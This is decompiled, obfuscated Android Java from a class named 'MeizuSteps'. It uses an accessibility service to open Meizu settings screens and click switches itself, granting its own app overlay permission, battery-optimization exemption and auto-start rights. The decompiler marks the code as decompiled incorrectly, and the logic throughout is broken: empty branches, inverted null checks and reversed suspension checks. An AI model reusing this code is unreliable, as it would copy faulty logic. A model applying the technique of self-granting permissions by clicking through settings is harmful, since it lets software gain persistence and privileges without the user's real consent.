                c0366a33 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a33;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 9;
                rootInActiveWindow2 = c0366a33.f55081a0.getRootInActiveWindow();
                if (rootInActiveWindow2 != null) {
                }
                if (objM212224a4 == coroutineSingletons) {
                }
                if (!((Boolean) objM212224a4).booleanValue()) {
                }
                break;
            case 9:
                c0366a33 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                if (!((Boolean) objM212224a4).booleanValue()) {
                }
                break;
            case 10:
                c0366a33 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a33;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 11;
                rootInActiveWindow3 = c0366a33.f55081a0.getRootInActiveWindow();
                if (rootInActiveWindow3 != null) {
                }
                if (bool == coroutineSingletons) {
                }
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a33;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 12;
                if (b81.m210571b1(1000L, meizuSteps$executeBatteryOptimizationInternal$1) == coroutineSingletons) {
                }
                Object systemService2 = c0366a33.f55082a1.getSystemService("power");
                t60.m214693b4(systemService2, "null cannot be cast to non-null type android.os.PowerManager");
                zIsIgnoringBatteryOptimizations = ((PowerManager) systemService2).isIgnoringBatteryOptimizations(c0366a33.f55082a1.getPackageName());
                if (zIsIgnoringBatteryOptimizations) {
                }
                break;
            case oe0.DEFAULT_M /* 11 */:
                c0366a33 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                meizuSteps$executeBatteryOptimizationInternal$1.f54222a0 = c0366a33;
                meizuSteps$executeBatteryOptimizationInternal$1.f54226a4 = 12;
                if (b81.m210571b1(1000L, meizuSteps$executeBatteryOptimizationInternal$1) == coroutineSingletons) {
                }
                Object systemService22 = c0366a33.f55082a1.getSystemService("power");
                t60.m214693b4(systemService22, "null cannot be cast to non-null type android.os.PowerManager");
                zIsIgnoringBatteryOptimizations = ((PowerManager) systemService22).isIgnoringBatteryOptimizations(c0366a33.f55082a1.getPackageName());
                if (zIsIgnoringBatteryOptimizations) {
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                c0366a33 = meizuSteps$executeBatteryOptimizationInternal$1.f54222a0;
                kg1.m213544f4(objM212224a4);
                Object systemService222 = c0366a33.f55082a1.getSystemService("power");
                t60.m214693b4(systemService222, "null cannot be cast to non-null type android.os.PowerManager");
                zIsIgnoringBatteryOptimizations = ((PowerManager) systemService222).isIgnoringBatteryOptimizations(c0366a33.f55082a1.getPackageName());
                if (zIsIgnoringBatteryOptimizations) {
                }
                break;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:26:0x009a  */
    /* JADX WARN: Removed duplicated region for block: B:36:0x00d2  */
    /* JADX WARN: Removed duplicated region for block: B:41:0x00f3  */
    /* JADX WARN: Removed duplicated region for block: B:46:0x010f  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x0112  */
    /* JADX WARN: Removed duplicated region for block: B:49:0x0116  */
    /* JADX WARN: Removed duplicated region for block: B:55:0x012f  */
    /* JADX WARN: Removed duplicated region for block: B:56:0x0132  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x014e  */
    /* JADX WARN: Removed duplicated region for block: B:65:0x0157  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x015a  */
    /* JADX WARN: Removed duplicated region for block: B:71:0x016e  */
    /* JADX WARN: Removed duplicated region for block: B:72:0x0176  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0016  */
    /* JADX WARN: Removed duplicated region for block: B:82:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:85:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:43:0x0107 -> B:17:0x005e). Please report as a decompilation issue!!! */
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m212220a2(C0366a3 c0366a3, String str, ContinuationImpl continuationImpl) {
        MeizuSteps$executeOverlayPermissionInternal$1 meizuSteps$executeOverlayPermissionInternal$1;
        int i;
        int i2;
        int i3;
        int i4;
        String str2;
        C0366a3 c0366a32;
        C0366a3 c0366a33;
        String str3;
        boolean z;
        C0366a3 c0366a34;
        c0366a3.getClass();
        if (continuationImpl instanceof MeizuSteps$executeOverlayPermissionInternal$1) {
            meizuSteps$executeOverlayPermissionInternal$1 = (MeizuSteps$executeOverlayPermissionInternal$1) continuationImpl;
            int i5 = meizuSteps$executeOverlayPermissionInternal$1.f54241a6;
            if ((i5 & Integer.MIN_VALUE) != 0) {
                meizuSteps$executeOverlayPermissionInternal$1.f54241a6 = i5 - Integer.MIN_VALUE;
            } else {
                meizuSteps$executeOverlayPermissionInternal$1 = new MeizuSteps$executeOverlayPermissionInternal$1(c0366a3, continuationImpl);
            }
        }
        Object objM212232b4 = meizuSteps$executeOverlayPermissionInternal$1.f54239a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i6 = meizuSteps$executeOverlayPermissionInternal$1.f54241a6;
        MeizuSteps$FlowType meizuSteps$FlowType = MeizuSteps$FlowType.OVERLAY_PERMISSION;
        int i7 = 1;
        switch (i6) {
            case 0:
                kg1.m213544f4(objM212232b4);
                if (Settings.canDrawOverlays(c0366a3.f55082a1)) {
                    t60.m214714d6(c0366a3.f55083a2, "[悬浮窗] 已有悬浮窗权限");
                    c0366a3.f55084a3.m214995b0(meizuSteps$FlowType);
                    return Boolean.TRUE;
                }
                i = 0;
                i2 = 0;
                if (i < 5) {
                    meizuSteps$executeOverlayPermissionInternal$1.f54235a0 = c0366a3;
                    meizuSteps$executeOverlayPermissionInternal$1.f54236a1 = str;
                    meizuSteps$executeOverlayPermissionInternal$1.f54237a2 = i2;
                    meizuSteps$executeOverlayPermissionInternal$1.f54238a3 = i;
                    meizuSteps$executeOverlayPermissionInternal$1.f54241a6 = 1;
                    c0366a3.getClass();
                    try {
                    } catch (Exception unused) {
                        z = false;
                    }
                    Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
                    intent.setFlags(276824064);
                    c0366a3.f55082a1.startActivity(intent);
                    z = true;
                    Boolean boolValueOf = Boolean.valueOf(z);
                    if (boolValueOf == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    c0366a32 = c0366a3;
                    i3 = i;
                    objM212232b4 = boolValueOf;
                    int i8 = i2;
                    str2 = str;
                    i4 = i8;
                    if (((Boolean) objM212232b4).booleanValue()) {
                        meizuSteps$executeOverlayPermissionInternal$1.f54235a0 = c0366a32;
                        meizuSteps$executeOverlayPermissionInternal$1.f54236a1 = str2;
                        meizuSteps$executeOverlayPermissionInternal$1.f54237a2 = i4;
                        meizuSteps$executeOverlayPermissionInternal$1.f54238a3 = i3;
                        meizuSteps$executeOverlayPermissionInternal$1.f54241a6 = 2;
                        if (b81.m210571b1(1000L, meizuSteps$executeOverlayPermissionInternal$1) == coroutineSingletons) {
                            return coroutineSingletons;
                        }
                        if (c0366a32.m212234b6("悬浮窗页面", AbstractC1117qo.m214451e7("settings"))) {
                            str = str2;
                            c0366a3 = c0366a32;
                            if (i7 != 0) {
                                return Boolean.FALSE;
                            }
                            meizuSteps$executeOverlayPermissionInternal$1.f54235a0 = c0366a3;
                            meizuSteps$executeOverlayPermissionInternal$1.f54236a1 = str;
                            meizuSteps$executeOverlayPermissionInternal$1.f54241a6 = 4;
                            objM212232b4 = c0366a3.m212232b4(str, meizuSteps$executeOverlayPermissionInternal$1);
                            if (objM212232b4 == coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            String str4 = str;
                            c0366a33 = c0366a3;
                            str3 = str4;
                            if (((Boolean) objM212232b4).booleanValue()) {
                                return Boolean.FALSE;
                            }
                            meizuSteps$executeOverlayPermissionInternal$1.f54235a0 = c0366a33;
                            meizuSteps$executeOverlayPermissionInternal$1.f54236a1 = str3;
                            meizuSteps$executeOverlayPermissionInternal$1.f54241a6 = 5;
                            if (b81.m210571b1(1000L, meizuSteps$executeOverlayPermissionInternal$1) == coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            meizuSteps$executeOverlayPermissionInternal$1.f54235a0 = c0366a33;
                            meizuSteps$executeOverlayPermissionInternal$1.f54236a1 = null;
                            meizuSteps$executeOverlayPermissionInternal$1.f54241a6 = 6;
                            objM212232b4 = c0366a33.m212226a6(str3, meizuSteps$executeOverlayPermissionInternal$1);
                            if (objM212232b4 != coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            c0366a34 = c0366a33;
                            if (((Boolean) objM212232b4).booleanValue()) {
                                return Boolean.FALSE;
                            }
                            meizuSteps$executeOverlayPermissionInternal$1.f54235a0 = c0366a34;
                            meizuSteps$executeOverlayPermissionInternal$1.f54241a6 = 7;
                            if (b81.m210571b1(1000L, meizuSteps$executeOverlayPermissionInternal$1) == coroutineSingletons) {
                                return coroutineSingletons;
                            }
                            if (Settings.canDrawOverlays(c0366a34.f55082a1)) {
                                return Boolean.FALSE;
                            }
                            c0366a34.f55084a3.m214995b0(meizuSteps$FlowType);
                            return Boolean.TRUE;
                        }
                    }
                    meizuSteps$executeOverlayPermissionInternal$1.f54235a0 = c0366a32;
                    meizuSteps$executeOverlayPermissionInternal$1.f54236a1 = str2;
                    meizuSteps$executeOverlayPermissionInternal$1.f54237a2 = i4;
                    meizuSteps$executeOverlayPermissionInternal$1.f54238a3 = i3;
                    meizuSteps$executeOverlayPermissionInternal$1.f54241a6 = 3;
                    if (b81.m210571b1(500L, meizuSteps$executeOverlayPermissionInternal$1) == coroutineSingletons) {
                        return coroutineSingletons;
                    }
                    String str5 = str2;
                    i2 = i4;
                    str = str5;
                    i = i3 + 1;
                    c0366a3 = c0366a32;
                    if (i < 5) {
                        i7 = i2;
                        if (i7 != 0) {
                        }
                    }
                }
            case 1:
                i3 = meizuSteps$executeOverlayPermissionInternal$1.f54238a3;
                i4 = meizuSteps$executeOverlayPermissionInternal$1.f54237a2;
                str2 = meizuSteps$executeOverlayPermissionInternal$1.f54236a1;
                c0366a32 = meizuSteps$executeOverlayPermissionInternal$1.f54235a0;
                kg1.m213544f4(objM212232b4);
                if (((Boolean) objM212232b4).booleanValue()) {
                }
                meizuSteps$executeOverlayPermissionInternal$1.f54235a0 = c0366a32;
                meizuSteps$executeOverlayPermissionInternal$1.f54236a1 = str2;
                meizuSteps$executeOverlayPermissionInternal$1.f54237a2 = i4;
                meizuSteps$executeOverlayPermissionInternal$1.f54238a3 = i3;
                meizuSteps$executeOverlayPermissionInternal$1.f54241a6 = 3;
                if (b81.m210571b1(500L, meizuSteps$executeOverlayPermissionInternal$1) == coroutineSingletons) {
                }
                String str52 = str2;
                i2 = i4;
                str = str52;
                i = i3 + 1;
                c0366a3 = c0366a32;
                if (i < 5) {
                }
                break;
            case 2:
                i3 = meizuSteps$executeOverlayPermissionInternal$1.f54238a3;
                i4 = meizuSteps$executeOverlayPermissionInternal$1.f54237a2;
                str2 = meizuSteps$executeOverlayPermissionInternal$1.f54236a1;
                c0366a32 = meizuSteps$executeOverlayPermissionInternal$1.f54235a0;
                kg1.m213544f4(objM212232b4);
                if (c0366a32.m212234b6("悬浮窗页面", AbstractC1117qo.m214451e7("settings"))) {
                }
                meizuSteps$executeOverlayPermissionInternal$1.f54235a0 = c0366a32;
                meizuSteps$executeOverlayPermissionInternal$1.f54236a1 = str2;
                meizuSteps$executeOverlayPermissionInternal$1.f54237a2 = i4;
                meizuSteps$executeOverlayPermissionInternal$1.f54238a3 = i3;
                meizuSteps$executeOverlayPermissionInternal$1.f54241a6 = 3;
                if (b81.m210571b1(500L, meizuSteps$executeOverlayPermissionInternal$1) == coroutineSingletons) {
                }
                String str522 = str2;
                i2 = i4;
                str = str522;
                i = i3 + 1;
                c0366a3 = c0366a32;
                if (i < 5) {
                }
                break;
            case 3:
                i3 = meizuSteps$executeOverlayPermissionInternal$1.f54238a3;
                i4 = meizuSteps$executeOverlayPermissionInternal$1.f54237a2;
                str2 = meizuSteps$executeOverlayPermissionInternal$1.f54236a1;
                c0366a32 = meizuSteps$executeOverlayPermissionInternal$1.f54235a0;
                kg1.m213544f4(objM212232b4);
                String str5222 = str2;
                i2 = i4;
                str = str5222;
                i = i3 + 1;
                c0366a3 = c0366a32;
                if (i < 5) {
                }
                break;
            case 4:
                str3 = meizuSteps$executeOverlayPermissionInternal$1.f54236a1;
                c0366a33 = meizuSteps$executeOverlayPermissionInternal$1.f54235a0;
                kg1.m213544f4(objM212232b4);
                if (((Boolean) objM212232b4).booleanValue()) {
                }
                break;
            case 5:
                str3 = meizuSteps$executeOverlayPermissionInternal$1.f54236a1;
                c0366a33 = meizuSteps$executeOverlayPermissionInternal$1.f54235a0;
                kg1.m213544f4(objM212232b4);
                meizuSteps$executeOverlayPermissionInternal$1.f54235a0 = c0366a33;
                meizuSteps$executeOverlayPermissionInternal$1.f54236a1 = null;
                meizuSteps$executeOverlayPermissionInternal$1.f54241a6 = 6;
                objM212232b4 = c0366a33.m212226a6(str3, meizuSteps$executeOverlayPermissionInternal$1);
                if (objM212232b4 != coroutineSingletons) {
                }
                break;
            case 6:
                c0366a34 = meizuSteps$executeOverlayPermissionInternal$1.f54235a0;
                kg1.m213544f4(objM212232b4);
                if (((Boolean) objM212232b4).booleanValue()) {
                }
                break;
            case 7:
                c0366a34 = meizuSteps$executeOverlayPermissionInternal$1.f54235a0;
                kg1.m213544f4(objM212232b4);
                if (Settings.canDrawOverlays(c0366a34.f55082a1)) {
                }
                break;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:100:0x0203  */
    /* JADX WARN: Removed duplicated region for block: B:101:0x0206  */
    /* JADX WARN: Removed duplicated region for block: B:125:0x0269  */
    /* JADX WARN: Removed duplicated region for block: B:126:0x026c  */
    /* JADX WARN: Removed duplicated region for block: B:150:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:152:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:30:0x00bb  */
    /* JADX WARN: Removed duplicated region for block: B:31:0x00c6  */
    /* JADX WARN: Removed duplicated region for block: B:37:0x00ea  */
    /* JADX WARN: Removed duplicated region for block: B:38:0x00ee  */
    /* JADX WARN: Removed duplicated region for block: B:43:0x0105  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x0109  */
    /* JADX WARN: Removed duplicated region for block: B:49:0x012a  */
    /* JADX WARN: Removed duplicated region for block: B:50:0x012e  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:91:0x01d8  */
    /* JADX WARN: Removed duplicated region for block: B:94:0x01e1  */
    /* JADX WARN: Removed duplicated region for block: B:95:0x01e5  */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final Object m212221a3(C0366a3 c0366a3, String str, ContinuationImpl continuationImpl) {
        MeizuSteps$executeStartupManagerInternal$1 meizuSteps$executeStartupManagerInternal$1;
        String str2;
        boolean z;
        C0366a3 c0366a32;
        String str3;
        AccessibilityNodeInfo rootInActiveWindow;
        Object obj;
        String string;
        C0366a3 c0366a33;
        AccessibilityNodeInfo rootInActiveWindow2;
        C0366a3 c0366a34 = c0366a3;
        if (continuationImpl instanceof MeizuSteps$executeStartupManagerInternal$1) {
            meizuSteps$executeStartupManagerInternal$1 = (MeizuSteps$executeStartupManagerInternal$1) continuationImpl;
            int i = meizuSteps$executeStartupManagerInternal$1.f54246a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                meizuSteps$executeStartupManagerInternal$1.f54246a4 = i - Integer.MIN_VALUE;
            } else {
                meizuSteps$executeStartupManagerInternal$1 = new MeizuSteps$executeStartupManagerInternal$1(c0366a34, continuationImpl);
            }
        }
        Object objValueOf = meizuSteps$executeStartupManagerInternal$1.f54244a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        switch (meizuSteps$executeStartupManagerInternal$1.f54246a4) {
            case 0:
                kg1.m213544f4(objValueOf);
                meizuSteps$executeStartupManagerInternal$1.f54242a0 = c0366a34;
                str2 = str;
                meizuSteps$executeStartupManagerInternal$1.f54243a1 = str2;
                meizuSteps$executeStartupManagerInternal$1.f54246a4 = 1;
                try {
                    Intent intent = new Intent();
                    intent.setComponent(new ComponentName(c0366a34.f55085a4, "com.meizu.safe.newpermission.start.StartManagerActivity"));
                    intent.setFlags(276824064);
                    c0366a34.f55082a1.startActivity(intent);
                    z = true;
                } catch (Exception e) {
                    tz0.m214807a7("[启动管理] 打开失败: ", e.getMessage(), c0366a34.f55083a2);
                    z = false;
                }
                objValueOf = Boolean.valueOf(z);
                if (objValueOf == coroutineSingletons) {
                    return coroutineSingletons;
                }
                if (((Boolean) objValueOf).booleanValue()) {
                    t60.m214704c5(c0366a34.f55083a2, "[启动管理] 无法打开启动管理页面");
                    return Boolean.FALSE;
                }
                meizuSteps$executeStartupManagerInternal$1.f54242a0 = c0366a34;
                meizuSteps$executeStartupManagerInternal$1.f54243a1 = str2;
                meizuSteps$executeStartupManagerInternal$1.f54246a4 = 2;
                if (b81.m210571b1(2000L, meizuSteps$executeStartupManagerInternal$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                String str4 = str2;
                c0366a32 = c0366a34;
                str3 = str4;
                if (c0366a32.m212234b6("启动管理页面", AbstractC1117qo.m214451e7(c0366a32.f55085a4))) {
                    return Boolean.FALSE;
                }
                meizuSteps$executeStartupManagerInternal$1.f54242a0 = c0366a32;
                meizuSteps$executeStartupManagerInternal$1.f54243a1 = str3;
                meizuSteps$executeStartupManagerInternal$1.f54246a4 = 3;
                objValueOf = c0366a32.m212233b5(str3, meizuSteps$executeStartupManagerInternal$1);
                if (objValueOf == coroutineSingletons) {
                    return coroutineSingletons;
                }
                if (((Boolean) objValueOf).booleanValue()) {
                    return Boolean.FALSE;
                }
                meizuSteps$executeStartupManagerInternal$1.f54242a0 = c0366a32;
                meizuSteps$executeStartupManagerInternal$1.f54243a1 = str3;
                meizuSteps$executeStartupManagerInternal$1.f54246a4 = 4;
                if (b81.m210571b1(1000L, meizuSteps$executeStartupManagerInternal$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                meizuSteps$executeStartupManagerInternal$1.f54242a0 = c0366a32;
                String str5 = null;
                meizuSteps$executeStartupManagerInternal$1.f54243a1 = null;
                meizuSteps$executeStartupManagerInternal$1.f54246a4 = 5;
                String str6 = c0366a32.f55083a2;
                rootInActiveWindow = c0366a32.f55081a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    objValueOf = Boolean.FALSE;
                } else {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str3);
                    t60.m214694b5(listFindAccessibilityNodeInfosByText, "appNodes");
                    Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                    while (true) {
                        if (it.hasNext()) {
                            Object next = it.next();
                            AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) next;
                            CharSequence text = accessibilityNodeInfo.getText();
                            if (text == null || (string = text.toString()) == null) {
                                string = "";
                            }
                            boolean zEquals = string.equals(str3);
                            if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.isVisibleToUser()) {
                                CharSequence className = accessibilityNodeInfo.getClassName();
                                String string2 = className != null ? className.toString() : str5;
                                if (string2 == null) {
                                    string2 = "";
                                }
                                if (!AbstractC0779a1.m213652a5(string2, "EditText", true) && zEquals) {
                                    obj = next;
                                }
                            }
                            str5 = null;
                        } else {
                            obj = null;
                        }
                    }
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                    if (accessibilityNodeInfo2 == null) {
                        t60.m214704c5(str6, "[启动管理] 未找到可点击的应用项");
                        Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                        while (it2.hasNext()) {
                            ((AccessibilityNodeInfo) it2.next()).recycle();
                        }
                        rootInActiveWindow.recycle();
                        objValueOf = Boolean.FALSE;
                    } else {
                        boolean zPerformAction = accessibilityNodeInfo2.performAction(16);
                        accessibilityNodeInfo2.recycle();
                        Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                        while (it3.hasNext()) {
                            ((AccessibilityNodeInfo) it3.next()).recycle();
                        }
                        rootInActiveWindow.recycle();
                        if (zPerformAction) {
                            objValueOf = Boolean.TRUE;
                        } else {
                            t60.m214704c5(str6, "[启动管理] 点击应用项失败");
                            objValueOf = Boolean.FALSE;
                        }
                    }
                }
                if (objValueOf != coroutineSingletons) {
                    return coroutineSingletons;
                }
                c0366a33 = c0366a32;
                if (((Boolean) objValueOf).booleanValue()) {
                    return Boolean.FALSE;
                }
                meizuSteps$executeStartupManagerInternal$1.f54242a0 = c0366a33;
                meizuSteps$executeStartupManagerInternal$1.f54246a4 = 6;
                if (b81.m210571b1(1500L, meizuSteps$executeStartupManagerInternal$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                meizuSteps$executeStartupManagerInternal$1.f54242a0 = c0366a33;
                meizuSteps$executeStartupManagerInternal$1.f54246a4 = 7;
                String str7 = c0366a33.f55083a2;
                rootInActiveWindow2 = c0366a33.f55081a0.getRootInActiveWindow();
                if (rootInActiveWindow2 != null) {
                    objValueOf = Boolean.FALSE;
                } else {
                    AccessibilityNodeInfo accessibilityNodeInfoM212223b0 = m212223b0(rootInActiveWindow2, "com.meizu.common.widget.Switch");
                    if (accessibilityNodeInfoM212223b0 == null) {
                        accessibilityNodeInfoM212223b0 = m212223b0(rootInActiveWindow2, "android.widget.Switch");
                    }
                    if (accessibilityNodeInfoM212223b0 == null || accessibilityNodeInfoM212223b0.isChecked()) {
                        if (accessibilityNodeInfoM212223b0 != null) {
                            accessibilityNodeInfoM212223b0.recycle();
                        }
                        rootInActiveWindow2.recycle();
                        t60.m214704c5(str7, "[启动管理] 未找到开关或已开启");
                        objValueOf = Boolean.FALSE;
                    } else if (accessibilityNodeInfoM212223b0.isClickable() && accessibilityNodeInfoM212223b0.isVisibleToUser()) {
                        boolean zPerformAction2 = accessibilityNodeInfoM212223b0.performAction(16);
                        accessibilityNodeInfoM212223b0.recycle();
                        rootInActiveWindow2.recycle();
                        if (zPerformAction2) {
                            objValueOf = Boolean.TRUE;
                        } else {
                            t60.m214704c5(str7, "[启动管理] 点击开关失败");
                            objValueOf = Boolean.FALSE;
                        }
                    } else {
                        accessibilityNodeInfoM212223b0.recycle();
                        rootInActiveWindow2.recycle();
                        t60.m214704c5(str7, "[启动管理] 开关不可点击或不可见");
                        objValueOf = Boolean.FALSE;
                    }
                }
                if (objValueOf == coroutineSingletons) {
                    return coroutineSingletons;
                }
                if (!((Boolean) objValueOf).booleanValue()) {
                    return Boolean.FALSE;
                }
                meizuSteps$executeStartupManagerInternal$1.f54242a0 = c0366a33;
                meizuSteps$executeStartupManagerInternal$1.f54246a4 = 8;
                if (b81.m210571b1(1000L, meizuSteps$executeStartupManagerInternal$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                c0366a33.f55084a3.m214995b0(MeizuSteps$FlowType.STARTUP_MANAGER);
                return Boolean.TRUE;
            case 1:
                String str8 = meizuSteps$executeStartupManagerInternal$1.f54243a1;
                C0366a3 c0366a35 = meizuSteps$executeStartupManagerInternal$1.f54242a0;
                kg1.m213544f4(objValueOf);
                str2 = str8;
                c0366a34 = c0366a35;
                if (((Boolean) objValueOf).booleanValue()) {
                }
                break;
            case 2:
                str3 = meizuSteps$executeStartupManagerInternal$1.f54243a1;
                c0366a32 = meizuSteps$executeStartupManagerInternal$1.f54242a0;
                kg1.m213544f4(objValueOf);
                if (c0366a32.m212234b6("启动管理页面", AbstractC1117qo.m214451e7(c0366a32.f55085a4))) {
                }
                break;
            case 3:
                str3 = meizuSteps$executeStartupManagerInternal$1.f54243a1;
                c0366a32 = meizuSteps$executeStartupManagerInternal$1.f54242a0;
                kg1.m213544f4(objValueOf);
                if (((Boolean) objValueOf).booleanValue()) {
                }
                break;
            case 4:
                str3 = meizuSteps$executeStartupManagerInternal$1.f54243a1;
                c0366a32 = meizuSteps$executeStartupManagerInternal$1.f54242a0;
                kg1.m213544f4(objValueOf);
                meizuSteps$executeStartupManagerInternal$1.f54242a0 = c0366a32;
                String str52 = null;
                meizuSteps$executeStartupManagerInternal$1.f54243a1 = null;
                meizuSteps$executeStartupManagerInternal$1.f54246a4 = 5;
                String str62 = c0366a32.f55083a2;
                rootInActiveWindow = c0366a32.f55081a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                }
                if (objValueOf != coroutineSingletons) {
                }
                break;
            case 5:
                c0366a33 = meizuSteps$executeStartupManagerInternal$1.f54242a0;
                kg1.m213544f4(objValueOf);
                if (((Boolean) objValueOf).booleanValue()) {
                }
                break;
            case 6:
                c0366a33 = meizuSteps$executeStartupManagerInternal$1.f54242a0;
                kg1.m213544f4(objValueOf);
                meizuSteps$executeStartupManagerInternal$1.f54242a0 = c0366a33;
                meizuSteps$executeStartupManagerInternal$1.f54246a4 = 7;
                String str72 = c0366a33.f55083a2;
                rootInActiveWindow2 = c0366a33.f55081a0.getRootInActiveWindow();
                if (rootInActiveWindow2 != null) {
                }
                if (objValueOf == coroutineSingletons) {
                }
                if (!((Boolean) objValueOf).booleanValue()) {
                }
                break;
            case 7:
                c0366a33 = meizuSteps$executeStartupManagerInternal$1.f54242a0;
                kg1.m213544f4(objValueOf);
                if (!((Boolean) objValueOf).booleanValue()) {
                }
                break;
            case 8:
                c0366a33 = meizuSteps$executeStartupManagerInternal$1.f54242a0;
                kg1.m213544f4(objValueOf);
                c0366a33.f55084a3.m214995b0(MeizuSteps$FlowType.STARTUP_MANAGER);
                return Boolean.TRUE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* renamed from: a9 */
    public static AccessibilityNodeInfo m212222a9(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                CharSequence className = child.getClassName();
                if (className != null && (string = className.toString()) != null && ((AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "ToggleButton", true) || AbstractC0779a1.m213652a5(string, "CheckBox", true)) && AbstractC0003a2.m24a5(child).left > rectM24a5.centerX())) {
                    return child;
                }
                child.recycle();
            }
        }
        return null;
    }

    /* renamed from: b0 */
    public static AccessibilityNodeInfo m212223b0(AccessibilityNodeInfo accessibilityNodeInfo, String str) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className != null && (string = className.toString()) != null && AbstractC0779a1.m213652a5(string, str, true)) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo accessibilityNodeInfoM212223b0 = m212223b0(child, str);
                if (accessibilityNodeInfoM212223b0 != null) {
                    return accessibilityNodeInfoM212223b0;
                }
                child.recycle();
            }
        }
        return null;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: a4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212224a4(ContinuationImpl continuationImpl) throws Throwable {
        MeizuSteps$clickAllAppsFilter$1 meizuSteps$clickAllAppsFilter$1;
        Object next;
        if (continuationImpl instanceof MeizuSteps$clickAllAppsFilter$1) {
            meizuSteps$clickAllAppsFilter$1 = (MeizuSteps$clickAllAppsFilter$1) continuationImpl;
            int i = meizuSteps$clickAllAppsFilter$1.f54178a2;
            if ((i & Integer.MIN_VALUE) != 0) {
                meizuSteps$clickAllAppsFilter$1.f54178a2 = i - Integer.MIN_VALUE;
            } else {
                meizuSteps$clickAllAppsFilter$1 = new MeizuSteps$clickAllAppsFilter$1(this, continuationImpl);
            }
        }
        Object obj = meizuSteps$clickAllAppsFilter$1.f54176a0;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = meizuSteps$clickAllAppsFilter$1.f54178a2;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            AccessibilityNodeInfo rootInActiveWindow = this.f55081a0.getRootInActiveWindow();
            if (rootInActiveWindow == null) {
                return Boolean.FALSE;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("所有应用");
            if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
                listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText("All apps");
            }
            t60.m214694b5(listFindAccessibilityNodeInfosByText, "allAppsNodes");
            Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
            while (true) {
                if (!it.hasNext()) {
                    next = null;
                    break;
                }
                next = it.next();
                AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) next;
                if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.isVisibleToUser()) {
